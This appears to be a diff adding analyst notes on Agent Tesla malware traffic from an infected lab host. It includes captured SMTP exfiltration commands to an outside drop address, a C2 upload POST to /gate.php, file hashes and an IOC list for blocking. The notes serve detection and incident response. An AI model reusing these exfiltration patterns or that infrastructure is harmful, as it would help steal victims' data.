@@ -1,0 +1,48 @@
+Agent Tesla Traffic Investigation Notes
+Date: 2025-02-08
+Source: Wireshark review — infected Windows host (lab VM)
+Case ref: ATESLA-2025-02
+
+=== INITIAL TRIAGE ===
+Helpdesk ticket: user reported Outlook slowness and repeated auth prompts.
+No approved use of external SMTP from this subnet.
+Traffic window: ~09:14–09:47 UTC.
+
+=== DNS OBSERVATIONS ===
+Query: mail-sync.top (A record)
+Query: update-service.top (A record)
+Later lookup: smtp-relay.ru (MX/A) — not a known business partner domain.
+
+=== SMTP EXFILTRATION (port 587) ===
+Follow SMTP stream on frame seq ~902:
+
+EHLO WORKSTATION01
+MAIL FROM: <victim@lab.local>
+RCPT TO: <drop@smtp-relay.ru>
+DATA
+...(attachment-style body, base64 chunks)...
+
+Message subject pattern: "Scan" / "Document" — typical Agent Tesla lure behavior.
+Destination IP for SMTP session: 185.234.215.98
+
+=== HTTP POST (C2 upload) ===
+POST /gate.php HTTP/1.1
+Host: update-service.top
+Content-Type: application/x-www-form-urlencoded
+
+id=WORKSTATION01&data=eyJpZCI6IndvcmsiLCJkYXRhIjoiLi4uIn0...
+
+Encoded POST body repeats every ~90 seconds — possible secondary exfil channel.
+
+=== FILE INDICATORS (from memory dump / VT pivot) ===
+Suspicious dropper MD5: 7c6a180b36896a0a8c02787eeafb0e4c
+Agent Tesla sample SHA256: 252f10c83410ecaad001ba59df6585b0a574740829470def1ca7fa823f849e8e
+
+=== IOC SUMMARY (for blocking / enrichment) ===
+IP: 185.234.215.98
+Domains: mail-sync.top, smtp-relay.ru, update-service.top
+
+=== NEXT STEPS ===
+- Block outbound SMTP except approved relay
+- Pull full SMTP and HTTP streams for IR ticket
+- Hunt for same hashes on other endpoints
